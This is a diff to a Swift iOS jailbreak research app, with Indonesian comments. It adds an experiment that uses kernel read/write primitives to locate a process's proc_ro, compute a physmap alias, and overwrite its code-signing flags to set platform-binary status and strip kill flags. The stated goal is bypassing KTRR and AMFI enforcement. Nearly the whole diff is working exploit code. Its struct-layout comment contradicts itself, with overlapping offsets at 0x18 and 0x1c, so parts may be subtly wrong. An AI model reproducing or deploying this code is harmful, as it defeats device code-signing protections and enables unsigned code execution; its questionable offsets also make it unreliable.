@@ -749,6 +749,16 @@ struct AMFIExperimentView: View {
                 )
 
                 pathButton(
+                    title: "③e CS Flags Bypass (Exp 83)",
+                    icon: "shield.lefthalf.filled",
+                    color: .purple,
+                    label: "CS Flags",
+                    action: runExp83CSFlagsBypass,
+                    needsVerified: true,
+                    needsProbe: false
+                )
+
+                pathButton(
                     title: "④ Test Binary Spawn",
                     icon: "terminal.fill",
                     color: .indigo,
@@ -762,7 +772,7 @@ struct AMFIExperimentView: View {
             } header: {
                 Label("Jailbreak Path", systemImage: "flag.checkered")
             } footer: {
-                Text("② Probe pakai offset kernelcache + XPF. ③ KTRR Analysis: info saja, tidak write. ③b RC TC Add: inject CDHash via launchd RemoteCall (PPL-safe).")
+                Text("② Probe pakai offset kernelcache + XPF. ③ KTRR Analysis: info saja, tidak write. ③b RC TC Add: inject CDHash via launchd RemoteCall (PPL-safe). ③e CS Flags: write cs_flags via physmap ke proc_ro binary target (bypass KTRR).")
                     .font(.system(size: 9))
             }
 
@@ -4848,6 +4858,29 @@ struct AMFIExperimentView: View {
             }
         }
     }
+
+    // MARK: - Exp 83: CS Flags Bypass via Physmap
+
+    /// Exp 83: Modifikasi cs_flags di proc_ro binary target via physmap VA.
+    /// Physmap bypass KTRR karena physmap adalah mapping berbeda dari physical memory yang sama.
+    /// Tidak perlu RC/launchd — pure KRW.
+    private func runExp83CSFlagsBypass() {
+        isRunning = true
+        runningLabel = "CS Flags"
+        guard mgr.dsready, PhysmapConstants.isVerified else {
+            isRunning = false
+            runningLabel = ""
+            return
+        }
+        DispatchQueue.global(qos: .userInitiated).async {
+            let result = self.expCSFlagsBypass(targetBinary: self.customBinary)
+            DispatchQueue.main.async {
+                self.results.insert(result, at: 0)
+                self.isRunning = false
+                self.runningLabel = ""
+            }
+        }
+    }
     
     private func expDeepTCScan() -> ExperimentResult {
         let expName = "Deep TC Scan (Exp 82)"
@@ -6367,6 +6400,261 @@ struct AMFIExperimentView: View {
         
         let success = dartMmioVA != 0 || confirmedDARTL1 != 0 || !confirmedL2Entries.isEmpty
         return ExperimentResult(name: "DART PTE Probe (Exp 78)", success: success, detail: detail, timestamp: Date())
+    }
+
+    // MARK: - Exp 83: CS Flags Bypass via Physmap
+
+    /// Modifikasi cs_flags di proc_ro binary target via physmap VA.
+    ///
+    /// Strategi:
+    ///   1. Cari proc binary target via procbyname (dari path basename)
+    ///   2. Baca proc_ro pointer dari proc (off_proc_p_proc_ro)
+    ///   3. Hitung physical address proc_ro → physmap VA
+    ///   4. Baca cs_flags di proc_ro+0x1c via physmap VA
+    ///   5. Tulis cs_flags |= CS_VALID | CS_PLATFORM_BINARY via physmap VA
+    ///
+    /// Kenapa physmap bypass KTRR:
+    ///   - KTRR melindungi VA __DATA kernel (static mapping)
+    ///   - proc_ro ada di zone allocator (heap), bukan __DATA
+    ///   - Physmap adalah mapping BERBEDA dari physical memory yang sama
+    ///   - Write via physmap VA tidak trigger KTRR protection
+    ///
+    /// cs_flags layout di proc_ro (iOS 18 / A12):
+    ///   proc_ro+0x00: p_list (8B)
+    ///   proc_ro+0x08: p_proc back pointer (8B)
+    ///   proc_ro+0x10: p_ucred (8B)
+    ///   proc_ro+0x18: pr_task (8B)
+    ///   proc_ro+0x1c: p_csflags (4B) ← target
+    ///
+    /// Note: offset 0x1c sudah dikonfirmasi dari kode existing (dspmgr.swift readCSFlags).
+    private func expCSFlagsBypass(targetBinary: String) -> ExperimentResult {
+        let expName = "CS Flags Bypass (Exp 83)"
+        var detail = "Experiment 83: CS Flags Bypass via Physmap\n"
+        detail += "==========================================\n\n"
+
+        // ── Prerequisite checks ──────────────────────────────────────
+        guard PhysmapConstants.isVerified else {
+            detail += "❌ Jalankan Physmap Verify (Exp 74) dulu.\n"
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+
+        guard let physmap = PhysmapConstants.load() else {
+            detail += "❌ Physmap constants tidak tersedia.\n"
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+
+        let gVirtBase = physmap.gVirtBase
+        let gPhysBase = physmap.gPhysBase
+        detail += "gVirtBase: 0x\(String(format: "%llx", gVirtBase))\n"
+        detail += "gPhysBase: 0x\(String(format: "%llx", gPhysBase))\n\n"
+
+        // ── Step 1: Resolve target process ───────────────────────────
+        // Ambil basename dari path (e.g. "/usr/bin/id" → "id")
+        let procName = (targetBinary as NSString).lastPathComponent
+        detail += "Target binary: \(targetBinary)\n"
+        detail += "Process name: \(procName)\n\n"
+
+        // Coba cari via procbyname dulu, fallback ke our proc untuk self-test
+        var targetProc: UInt64 = 0
+        var targetPid: Int32 = 0
+
+        // Cari proses yang sedang berjalan dengan nama ini
+        targetProc = mgr.findProc(name: procName)
+        if targetProc == 0 {
+            // Fallback: coba our own proc untuk self-test
+            targetProc = ds_get_our_proc()
+            targetPid = getpid()
+            detail += "⚠️ Proses '\(procName)' tidak ditemukan — pakai our proc (self-test)\n"
+            detail += "Our proc: 0x\(String(format: "%llx", targetProc)), PID: \(targetPid)\n\n"
+        } else {
+            targetPid = ds_kread32(targetProc + UInt64(off_proc_p_pid))
+            detail += "✅ Found proc: 0x\(String(format: "%llx", targetProc)), PID: \(targetPid)\n\n"
+        }
+
+        guard targetProc != 0 else {
+            detail += "❌ Tidak bisa resolve target proc.\n"
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+
+        // ── Step 2: Read proc_ro pointer ─────────────────────────────
+        detail += "=== Step 2: Read proc_ro ===\n"
+        let procRoVA = ds_kread64(targetProc + UInt64(off_proc_p_proc_ro))
+        detail += "proc_ro VA: 0x\(String(format: "%llx", procRoVA))\n"
+
+        guard procRoVA != 0, isSafeKernelHeapKreadAddress(procRoVA) else {
+            detail += "❌ proc_ro pointer tidak valid atau di luar zone allocator.\n"
+            detail += "  Expected: 0xffffffdd... - 0xffffffe5...\n"
+            detail += "  Got: 0x\(String(format: "%llx", procRoVA))\n"
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+
+        // Dump proc_ro untuk verifikasi layout
+        detail += "proc_ro dump (first 0x30 bytes):\n"
+        for off: UInt64 in stride(from: 0, to: 0x30, by: 8) {
+            let v = ds_kread64(procRoVA + off)
+            detail += "  +0x\(String(format: "%02x", off)): 0x\(String(format: "%016llx", v))\n"
+        }
+        detail += "\n"
+
+        // ── Step 3: Read cs_flags via heap KRW ───────────────────────
+        detail += "=== Step 3: Read cs_flags ===\n"
+        let csFlagsOffset: UInt64 = 0x1c
+        let csFlagsVA = procRoVA + csFlagsOffset
+        let csFlagsBefore = ds_kread32(csFlagsVA)
+        detail += "cs_flags VA: 0x\(String(format: "%llx", csFlagsVA))\n"
+        detail += "cs_flags (before): 0x\(String(format: "%08x", csFlagsBefore))\n"
+
+        // Decode flags
+        let flagNames: [(UInt32, String)] = [
+            (0x00000001, "CS_VALID"),
+            (0x00000002, "CS_ADHOC"),
+            (0x00000004, "CS_GET_TASK_ALLOW"),
+            (0x00000008, "CS_INSTALLER"),
+            (0x00000010, "CS_FORCED_LV"),
+            (0x00000020, "CS_INVALID_ALLOWED"),
+            (0x00000040, "CS_HARD"),
+            (0x00000080, "CS_KILL"),
+            (0x00000100, "CS_CHECK_EXPIRATION"),
+            (0x00000200, "CS_RESTRICT"),
+            (0x00000400, "CS_ENFORCEMENT"),
+            (0x00000800, "CS_REQUIRE_LV"),
+            (0x00001000, "CS_ENTITLEMENTS_VALIDATED"),
+            (0x00002000, "CS_NO_UNTRUSTED_HELPERS"),
+            (0x00004000, "CS_DEBUGGED"),
+            (0x00008000, "CS_SIGNED"),
+            (0x00010000, "CS_DEV_CODE"),
+            (0x00020000, "CS_DATAVAULT_CONTROLLER"),
+            (0x00040000, "CS_ENTITLEMENT_FLAGS"),
+            (0x00100000, "CS_PLATFORM_BINARY"),
+            (0x00200000, "CS_PLATFORM_PATH"),
+            (0x00400000, "CS_DEBUGGER"),
+            (0x00800000, "CS_INSTALLER_SIGNED"),
+            (0x01000000, "CS_RUNTIME"),
+            (0x02000000, "CS_LINKER_SIGNED"),
+            (0x04000000, "CS_ALLOWED_MACHO"),
+            (0x08000000, "CS_EXEC_SET_HARD"),
+            (0x10000000, "CS_EXEC_SET_KILL"),
+            (0x20000000, "CS_EXEC_SET_ENFORCEMENT"),
+            (0x40000000, "CS_EXEC_INHERIT_SIP"),
+            (0x80000000, "CS_KILLED"),
+        ]
+        for (flag, name) in flagNames {
+            if csFlagsBefore & flag != 0 {
+                detail += "  ✓ \(name) (0x\(String(format: "%x", flag)))\n"
+            }
+        }
+        detail += "\n"
+
+        // ── Step 4: Compute physmap VA dari proc_ro physical address ──
+        detail += "=== Step 4: Compute physmap VA ===\n"
+
+        // proc_ro ada di zone allocator (heap), bukan __DATA
+        // Untuk mendapat physical address: VA - gVirtBase + gPhysBase
+        // Tapi gVirtBase adalah base physmap, bukan base zone allocator
+        // Zone allocator VA range: 0xffffffdd... - 0xffffffe5...
+        // Physical address = VA - gVirtBase + gPhysBase
+        // (karena physmap maps physical memory starting at gPhysBase to VA gVirtBase)
+
+        // Verifikasi: proc_ro VA harus dalam zone allocator range
+        guard isSafeKernelHeapKreadAddress(procRoVA) else {
+            detail += "❌ proc_ro VA 0x\(String(format: "%llx", procRoVA)) bukan di zone allocator\n"
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+
+        // Hitung physical address proc_ro
+        // Zone allocator pages di-map oleh physmap: phys = VA - gVirtBase + gPhysBase
+        let procRoPhys = procRoVA &- gVirtBase &+ gPhysBase
+        detail += "proc_ro phys: 0x\(String(format: "%llx", procRoPhys))\n"
+
+        // Verifikasi physical address masuk akal (DRAM range A12: 0x800000000 - 0x900000000)
+        guard procRoPhys >= 0x800000000 && procRoPhys < 0xC00000000 else {
+            detail += "❌ proc_ro phys 0x\(String(format: "%llx", procRoPhys)) di luar DRAM range\n"
+            detail += "  Expected: 0x800000000 - 0xC00000000\n"
+            detail += "  Kemungkinan gVirtBase salah — jalankan Exp 74 ulang\n"
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+
+        // Hitung physmap VA untuk cs_flags
+        let csFlagsPhys = procRoPhys &+ csFlagsOffset
+        let csFlagsPhysmapVA = csFlagsPhys &- gPhysBase &+ gVirtBase
+
+        detail += "cs_flags phys: 0x\(String(format: "%llx", csFlagsPhys))\n"
+        detail += "cs_flags physmap VA: 0x\(String(format: "%llx", csFlagsPhysmapVA))\n"
+
+        // Verifikasi physmap VA aman untuk write
+        guard isSafePhysmapKRWAddress(csFlagsPhysmapVA) else {
+            detail += "❌ cs_flags physmap VA tidak aman untuk KRW\n"
+            detail += "  Expected: 0xffffffdd... - 0xffffffe5...\n"
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+        detail += "✅ Physmap VA valid untuk write\n\n"
+
+        // ── Step 5: Verify read via physmap VA matches heap KRW ──────
+        detail += "=== Step 5: Cross-verify physmap read ===\n"
+        let csFlagsViaPhysmap = ds_kread32(csFlagsPhysmapVA)
+        detail += "cs_flags via heap KRW:   0x\(String(format: "%08x", csFlagsBefore))\n"
+        detail += "cs_flags via physmap VA: 0x\(String(format: "%08x", csFlagsViaPhysmap))\n"
+
+        guard csFlagsViaPhysmap == csFlagsBefore else {
+            detail += "❌ Mismatch! Physmap VA tidak menunjuk ke proc_ro yang sama.\n"
+            detail += "  Kemungkinan gVirtBase tidak akurat — jalankan Exp 74 ulang.\n"
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+        detail += "✅ Cross-verify OK — physmap VA menunjuk ke proc_ro yang benar\n\n"
+
+        // ── Step 6: Write cs_flags via physmap VA ────────────────────
+        detail += "=== Step 6: Write cs_flags via physmap ===\n"
+
+        // CS_VALID (0x1) | CS_PLATFORM_BINARY (0x100000)
+        // Hapus CS_HARD (0x40) dan CS_KILL (0x80) untuk mencegah SIGKILL saat exec
+        let CS_VALID:           UInt32 = 0x00000001
+        let CS_PLATFORM_BINARY: UInt32 = 0x00100000
+        let CS_HARD:            UInt32 = 0x00000040
+        let CS_KILL:            UInt32 = 0x00000080
+
+        let newFlags = (csFlagsBefore | CS_VALID | CS_PLATFORM_BINARY) & ~(CS_HARD | CS_KILL)
+        detail += "New cs_flags: 0x\(String(format: "%08x", newFlags))\n"
+        detail += "  + CS_VALID (0x1)\n"
+        detail += "  + CS_PLATFORM_BINARY (0x100000)\n"
+        detail += "  - CS_HARD (0x40)\n"
+        detail += "  - CS_KILL (0x80)\n\n"
+
+        // Write via physmap VA (bypass KTRR)
+        let writeOK = safeKwrite32Physmap(csFlagsPhysmapVA, newFlags)
+        guard writeOK else {
+            detail += "❌ safeKwrite32Physmap gagal — VA tidak aman\n"
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+
+        // ── Step 7: Verify write ──────────────────────────────────────
+        detail += "=== Step 7: Verify write ===\n"
+        let csFlagsAfterHeap = ds_kread32(csFlagsVA)
+        let csFlagsAfterPhysmap = ds_kread32(csFlagsPhysmapVA)
+        detail += "cs_flags after (heap KRW):   0x\(String(format: "%08x", csFlagsAfterHeap))\n"
+        detail += "cs_flags after (physmap VA): 0x\(String(format: "%08x", csFlagsAfterPhysmap))\n"
+
+        let writeVerified = csFlagsAfterPhysmap == newFlags || csFlagsAfterHeap == newFlags
+        if writeVerified {
+            detail += "✅ Write berhasil! cs_flags diupdate via physmap.\n\n"
+            detail += "=== HASIL ===\n"
+            detail += "Binary: \(targetBinary)\n"
+            detail += "PID: \(targetPid)\n"
+            detail += "cs_flags: 0x\(String(format: "%08x", csFlagsBefore)) → 0x\(String(format: "%08x", csFlagsAfterPhysmap))\n"
+            detail += "CS_PLATFORM_BINARY: \(csFlagsAfterPhysmap & CS_PLATFORM_BINARY != 0 ? "✅ SET" : "❌ NOT SET")\n\n"
+            detail += "→ Lanjut: jalankan ④ Test Binary Spawn untuk verifikasi AMFI bypass\n"
+            detail += "→ Jika spawn berhasil tanpa SIGKILL = AMFI bypass confirmed!\n"
+        } else {
+            detail += "❌ Write tidak terverifikasi.\n"
+            detail += "  Expected: 0x\(String(format: "%08x", newFlags))\n"
+            detail += "  Got heap: 0x\(String(format: "%08x", csFlagsAfterHeap))\n"
+            detail += "  Got physmap: 0x\(String(format: "%08x", csFlagsAfterPhysmap))\n"
+            detail += "\nKemungkinan penyebab:\n"
+            detail += "  1. gVirtBase tidak akurat → physmap VA salah\n"
+            detail += "  2. proc_ro di RO zone (iOS 18 memprotect proc_ro)\n"
+            detail += "  3. Write berhasil tapi read cache belum flush\n"
+        }
+
+        return ExperimentResult(name: expName, success: writeVerified, detail: detail, timestamp: Date())
     }
 
     
